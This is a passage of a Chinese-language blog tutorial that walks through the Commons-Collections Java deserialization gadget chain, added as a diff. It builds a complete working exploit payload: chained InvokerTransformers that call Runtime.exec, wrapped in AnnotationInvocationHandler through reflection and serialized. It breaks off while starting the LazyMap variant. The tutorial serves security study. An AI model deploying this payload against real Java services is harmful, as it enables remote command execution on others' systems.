+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747029000-bfe582df-c388-4812-8a4d-c395b9bdbec8.png" alt="img" /></p>
+
+<p>到这一步我们可以继续寻找 chain，如果有一个以 Entry 形式遍历 Map 的地方，并且调用了 setValue 方法。那么就可以调用这一条链。当然，最终我们的目标是溯源到某个类的 readObject 方法中。</p>
+
+<p>继续使用 IDEA 的 find Usages 寻找。</p>
+
+<p>在 sun.reflect.annotation 中找到了对 setValue 方法的调用，并且是在 readObject 方法中调用。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747034123-aef3caff-3f0e-48b9-8938-e64e4cab3b22.png" alt="img" /></p>
+
+<p>AnnotationInvocationHandler 类的 readObject 方法中遍历 memberValues 然后调用 setValue 方法。memberValues 是在构造函数中直接赋值的。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747039258-a0a3a63b-2819-4f7d-8396-b8d14e2fb35d.png" alt="img" /></p>
+
+<p>因此，我们可以在序列化时将 memberValues 设置为一个用 TramformedMap.decorate 方法装饰过的 Map ，在反序列化时遍历这个 Map，同时调用 setValue 方法，进而把后面的利用链走通。</p>
+
+<p>到这一步基本上能够把整条链串起来了。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747043580-3f9d30fc-360d-4454-a00b-9593799c5bf3.png" alt="img" /></p>
+
+<p>下面我们可以尝试编写代码序列化一个 AnnotationInvocationHandler。需要注意以下几点：</p>
+
+<ol>
+  <li>AnnotationInvocationHandler 是一个用于注解的动态代理。</li>
+  <li>
+    <p>构造器接收两个参数<code class="language-plaintext highlighter-rouge">Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues</code>，第一个是 type，需要输入一个继承于 Annotation 接口的注解类的 Class 对象，例如 Target.class，第二个是memberValues，一个 Map&lt;String,Object&gt; 对象。</p>
+  </li>
+  <li>另外，AnnotationInvocationHandler 没有 public 标识，所以是 default 类型，default 类型只允许在同一个包内访问。也就是 package sun.reflect.annotation，<strong>因此，在实例化对象的时候，不能直接 new，而是要通过反射去获取。</strong></li>
+</ol>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span>
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"111"</span><span class="o">,</span><span class="s">"222"</span><span class="o">);</span>
+
+        <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="nc">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
+        
+<span class="c1">//        Runtime r = Runtime.getRuntime();</span>
+<span class="c1">//        for(Map.Entry entry: transformedMap.entrySet()){</span>
+<span class="c1">//            entry.setValue(r);</span>
+<span class="c1">//        }</span>
+        <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">transformedMap</span><span class="o">));</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="nc">Object</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">));</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>编写完序列化的语句之后，还有两个问题需要解决</p>
+
+<h3 id="1-解决-runtime-对象不能序列化">1. 解决 Runtime 对象不能序列化</h3>
+
+<p>Runtime 对象是不能够直接序列化的，因此我们必须反射获取一个 Rumtime 对象。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747062657-087d039c-57e0-47b2-b6f0-1f42325e10ef.png" alt="img" /></p>
+
+<p>Runtime 对象不能反序列化，但是 Runtime.class 可以反向列化</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747065783-df5cf8e7-913a-4b08-b0b0-154de41dcdab.png" alt="img" /></p>
+
+<p>因此我们可以从 Runtime.class 入手来编写执行任意命令的语句，其中也需要注意几个要点：</p>
+
+<ol>
+  <li>exec 并不是一个静态方法，因此在执行前也需要实例化一个 Runtime 对象。</li>
+  <li>
+    <p>实例化 Runtime 对象时不能直接使用构造器进行实例化，原因在于构造器是一个私有方法，但我们可以通过调用 getRuntime 方法获得一个实例。</p>
+  </li>
+  <li>getRuntime 方法是一个静态方法，因此在 invoke 调用时，第一个参数为 null，由于 getRuntime 不需要参数，<strong>但是也可以为自身</strong>，因此 invoke 第二个参数也为 null。</li>
+  <li>别忘了 Runtime 的强制类型转换。
+   最终编写如下：</li>
+</ol>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testRuntimeClass</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+        <span class="nc">Method</span> <span class="n">getRuntimeMethod</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">);</span>
+        <span class="nc">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Runtime</span><span class="o">)</span><span class="n">getRuntimeMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">Method</span> <span class="n">execMethod</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">execMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">r</span><span class="o">,</span><span class="s">"calc"</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>在序列化时，需要改成 InvokerTransformer 调用的形式，需要注意以下几点：</p>
+
+<ol>
+  <li>getMethod 方法的第一个参数是函数名，第二个参数是可变数量的 Class 数组。</li>
+  <li>invoke 函数的第一个参数类型为 Object ，第二个参数类型为 Object 数组。
+   最终改写如下：</li>
+</ol>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testRuntimeClassInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">ob1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span>
+                <span class="s">"getMethod"</span><span class="o">,</span>
+                        <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                        <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                <span class="o">).</span><span class="na">transform</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="c1">// Class c = Runtime.class;</span>
+        <span class="c1">// Method getRuntimeMethod = c.getMethod("getRuntime");</span>
+        <span class="nc">Object</span> <span class="n">ob2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span>
+                <span class="s">"invoke"</span><span class="o">,</span>
+                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+        <span class="o">).</span><span class="na">transform</span><span class="o">(</span><span class="n">ob1</span><span class="o">);</span>
+        <span class="c1">// Runtime r = (Runtime)getRuntimeMethod.invoke(null,null);</span>
+        <span class="nc">Object</span> <span class="n">ob3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span>
+                <span class="s">"exec"</span><span class="o">,</span>
+                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}</span>
+        <span class="o">).</span><span class="na">transform</span><span class="o">(</span><span class="n">ob2</span><span class="o">);</span>
+        <span class="c1">// exec.invoke(r,"calc");</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>这样，Runtime 序列化的问题就解决了。</strong></p>
+
+<p>值得一提的是，从上面的三个 InvokerTransformer 的调用关系上来看，实际上是一个链式调用。前一个的输出作为后一个的输入，在 Common-collections 中，有一个 ChainedTransformer 可以用于 Transformer 的链式调用。</p>
+
+<p>这个类的 transform 方法的作用就是链式调用 iTransformers。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747080817-c3add96d-a736-45ce-b5aa-bbf52b8b25ec.png" alt="img" /></p>
+
+<p>iTransformers 是一个 Transformer 数组，构造器传入参数时赋值。</p>
+
+<p>因此，我们可以将上面三个 InvokerTransformer 合并到一个 ChainedTransformer 中。</p>
+
+<p>改写如下；</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testRuntimeClassChainedTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+                <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"getMethod"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                    <span class="o">),</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"invoke"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                    <span class="o">),</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"exec"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}</span>
+                    <span class="o">)</span>
+            <span class="o">});</span>
+        <span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>将这部分代码替换掉之前的 InvokerTransformer。</p>
+
+<p>改写的代码如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+                <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"getMethod"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"invoke"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"exec"</span><span class="o">,</span>
+                                <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                                <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}</span>
+                        <span class="o">)</span>
+                <span class="o">});</span>
+
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"222"</span><span class="o">);</span>
+
+        <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="nc">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+        <span class="nc">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+
+        <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">transformedMap</span><span class="o">));</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="2-解决传入参数不可控问题">2. 解决传入参数不可控问题</h3>
+
+<p>setValue 需要传入 Runtime 对象，而在 AnnotationInvocationHandler 的 readObject 方法中是一个 AnnotationTypeMismatchExceptionProxy 对象。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747090204-4b7fb9e4-d42b-40bb-90c1-fcf71d7a9ab5.png" alt="img" /></p>
+
+<p>面对这种较为复杂的代码，最好是动态调试一下。</p>
+
+<p>进入 readObject，可以看到 this.memberValues 就是我们最初对 map 的赋值。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747093291-d635f3a7-80bd-4388-ab22-16483188e294.png" alt="img" /></p>
+
+<p>尔后循环遍历 memberValues。第一个 if 判断 memberType 是否为 null，memberTypes 取自 annotationType.memberTypes()，name 为键名。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747099573-e5ed8f97-1393-426f-ad40-de39113d6238.png" alt="img" /></p>
+
+<p>而 annotationType 是通过我们传入 type 进行实例化的。可以看到 type 就是在前面构造时赋值的 Override.class</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747104282-d11c419d-4550-4df7-8c67-51a6c92b8b30.png" alt="img" /></p>
+
+<p>这里的意思是从传入的 map 中取出 entry ，然后判断 key 的值，是否是 Override 这个接口的属性。而 Override 并没有任何属性，因此的 memberType 为 null。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747112815-c097ff1f-5a75-415b-9b7f-6fb8e09f2ab5.png" alt="img" /></p>
+
+<p>所以我们可以在构造时选择 Target.class 或者其他带有属性、且继承于 annotation 接口的注解类。可以看到 Target 接口中有 value 这个属性。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747118755-49b6ce7c-50b9-4f0c-afe6-e503b4e730ef.png" alt="img" /></p>
+
+<p>修改：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"222"</span><span class="o">);</span>
+<span class="o">...</span>
+<span class="n">serialize</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">));</span>
+</code></pre></div></div>
+
+<p>然后再次调试：</p>
+
+<p>传入的 value 只是一个 String 实例，memberType 是 java.lang.annotation.ElementType 类，因此这里可以直接进去。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747124190-9d317869-a0d5-44d0-b161-75f99f5765c4.png" alt="img" /></p>
+
+<p>终于到了 memberValue.setValue 方法，但是这里的参数并不是我们想要的 Runtime.class。我们可以在 TransformedMap.checkSetValue 处下一个断点。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747128333-6b11dbad-2c09-4cb9-9602-70fff4be8af2.png" alt="img" /></p>
+
+<p>这里的 valueTransformer 是我们传入的 chainedTransformer ，调用 transform 方法，但是 value 并不是我们想要的 Runtime.class 。</p>
+
+<p>怎么解决这个问题呢？</p>
+
+<p>Common-collection 中提供了一个 ConstantTransformer，这个类在调用 transform 方法时，无论传入什么参数，都返回自己的 iConstant 成员变量。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747147206-05e52386-0454-429f-9e91-382201925157.png" alt="img" /></p>
+
+<p>而 iConstant 成员变量是在构造器中赋值的，因此我们可控。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747180645-9ef818f2-6a00-4dd9-942b-aa91c0e1e409.png" alt="img" /></p>
+
+<p>所以，我们在 chainedTransformer 中可以再添加一个 ConstantTransformer，即使在 AnnotationInvocationHandler.readObject 中调用 setValue 方法时参数并不是 Runtime.class ，ConstantTransformer 也能直接返回 Runtime.class。</p>
+
+<p>解决了上述两个问题之后，最终 payload 如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+    <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+            <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                    <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span>
+                            <span class="nc">Runtime</span><span class="o">.</span><span class="na">class</span>
+                    <span class="o">),</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"getMethod"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                    <span class="o">),</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"invoke"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}</span>
+                    <span class="o">),</span>
+                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                            <span class="s">"exec"</span><span class="o">,</span>
+                            <span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                            <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}</span>
+                    <span class="o">)</span>
+            <span class="o">});</span>
+
+    <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"222"</span><span class="o">);</span>
+
+    <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="nc">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+    <span class="nc">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+
+    <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+    <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">serialize</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">transformedMap</span><span class="o">));</span>
+    <span class="n">unserialize</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>可以成功执行命令。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747193131-a8b656be-aff2-4858-a56e-6cf357d1b7ab.png" alt="img" /></p>
+
+<h2 id="0x04-lazymap-调用链">0x04 LazyMap 调用链</h2>
+
+<p>从最开始寻找哪里调用 transfrom 方法时，上面我们选择了 TramformedMap ，但从查询结果看其实 LazyMap.get 方法也调用了 transform 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747323118-487f78f0-a6e6-4925-bf25-86da1e1c693a.png" alt="img" /></p>
+
+<p>其实，ysoserial 中的 payload 也是用的 LazyMap。下面继续分析 LazyMap 这一条调用链。</p>
+
+<p>LazyMap.get 方法调用了 factory 的 transform 方法，factory 在构造器中赋值，因此可控。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747328558-352ff72a-718c-464e-970e-ab3343189988.png" alt="img" /></p>
+
+<p>如果继续寻找哪里调用了 get 方法是很困难的，get 的同名方法非常多，如果直接去找如同大海捞针，利用链的作者在 AnnotationInvocationHandler 中找到了这样一条利用链。</p>
+
+<p>在 invoke 方法中调用了 memberValues.get，而 memberValues 来自于构造器传入的参数，是我们可控的。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747557774-97f177e8-f1b0-48e0-b091-9ca8ccb66722.png" alt="img" /></p>
+
+<p>并且参数 mamber 来自于 invoke 的参数，表示调用的方法名。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747562104-009cc111-adfd-474b-915f-5a13f2aa7a0d.png" alt="img" /></p>
+
+<p>AnnotationInvocationHandler 本质就是一个 Annotation 类的动态代理，因此只要代理对象调用任何方法，就可以调用这个 invoke 方法。</p>
+
+<p>到这一步，利用链如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747567195-15e421a2-6a33-4ce7-b361-fc2f7ec38aff.png" alt="img" /></p>
+
+<p>再一个问题就是用 AnnotationInvocationHandler 去代理什么？当然，随便调用什么方法都可以触发 AnnotationInvocationHandler 的 invoke 。但是，我们在调用 invoke 后，要想运行到 <code class="language-plaintext highlighter-rouge">Object result = memberValues.get(member);</code>还需要考虑下面的三个判断。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747572433-5b63f70f-1527-4e85-a0b7-405653663ab8.png" alt="img" /></p>
+
+<ul>
+  <li>方法名不等于 equals</li>
+  <li>
+    <p>调用方法的参数数量需要等于零，也就是需要调用无参方法。</p>
+  </li>
